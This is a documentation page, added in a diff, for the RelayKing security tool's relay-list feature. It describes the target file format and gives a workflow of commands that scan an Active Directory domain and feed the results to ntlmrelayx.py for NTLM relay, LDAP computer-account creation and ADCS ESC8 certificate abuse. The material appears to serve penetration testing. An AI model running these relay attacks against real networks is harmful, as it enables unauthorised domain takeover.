@@ -1,0 +1,97 @@
+---
+title: "Relay list generation"
+description: "Generate a ready-to-use ntlmrelayx.py target file from RelayKing scan results."
+---
+
+The `--gen-relay-list <file>` flag tells RelayKing to write all relayable targets to a file in URI format as the scan progresses. The output file is compatible with ntlmrelayx.py's `-tf` flag.
+
+## Output format
+
+Each entry is a URI string:
+
+- **Non-HTTP protocols**: `protocol://hostname`
+- **HTTP/HTTPS**: `protocol://hostname:port/path` — the full NTLM-enabled path is included, since relaying to the web root will not work.
+
+Examples:
+
+```
+smb://dc01.corp.local
+ldap://dc01.corp.local
+ldaps://dc01.corp.local
+smb://fileserver01.corp.local
+http://sccm.corp.local:80/ccm_system_windowsauth
+https://adcs.corp.local:443/certsrv/
+mssql://sql01.corp.local
+```
+
+<Note>
+  For HTTP and HTTPS targets, RelayKing includes the specific path that exposes NTLM authentication (e.g., `/ccm_system_windowsauth` for SCCM or `/certsrv/` for ADCS). Generic paths that do not trigger NTLM negotiation are excluded.
+</Note>
+
+## Complete workflow
+
+<Steps>
+  <Step title="Run RelayKing with relay list generation">
+    ```bash
+    python3 relayking.py \
+      -u 'lowpriv' -p 'lowpriv-password' \
+      -d corp.local \
+      --dc-ip 10.0.0.1 \
+      --audit \
+      --protocols smb,ldap,ldaps,mssql,http,https \
+      -o plaintext,json \
+      --output-file relayking-scan \
+      --proto-portscan \
+      --gen-relay-list relaytargets.txt
+    ```
+
+    As the scan runs, discovered relay targets are appended to `relaytargets.txt` after each scan group completes.
+  </Step>
+
+  <Step title="Review the relay list">
+    ```bash
+    cat relaytargets.txt
+    ```
+
+    Example file contents:
+
+    ```
+    http://sccm.corp.local:80/ccm_system_windowsauth
+    ldap://dc01.corp.local
+    ldaps://dc01.corp.local
+    mssql://sql01.corp.local
+    smb://fileserver01.corp.local
+    smb://workstation42.corp.local
+    ```
+  </Step>
+
+  <Step title="Start a listener and pass the relay list to ntlmrelayx.py">
+    ```bash
+    ntlmrelayx.py -tf relaytargets.txt -smb2support
+    ```
+
+    For LDAP relay with computer account creation:
+
+    ```bash
+    ntlmrelayx.py -tf relaytargets.txt -smb2support --add-computer relayed-pc
+    ```
+
+    For ADCS relay (ESC8):
+
+    ```bash
+    ntlmrelayx.py -tf relaytargets.txt -smb2support --adcs --template DomainController
+    ```
+  </Step>
+</Steps>
+
+## Session resume behavior
+
+When resuming an interrupted scan with `--session-resume`, the relay list filename is restored from the session file automatically. Newly discovered targets are appended to the existing file rather than overwriting it.
+
+## Duplicate handling
+
+RelayKing deduplicates relay targets within each scan group. If multiple scan groups produce the same target URI, it may appear more than once across groups when appending. Use `sort -u` to deduplicate the final file if needed:
+
+```bash
+sort -u relaytargets.txt -o relaytargets.txt
+```
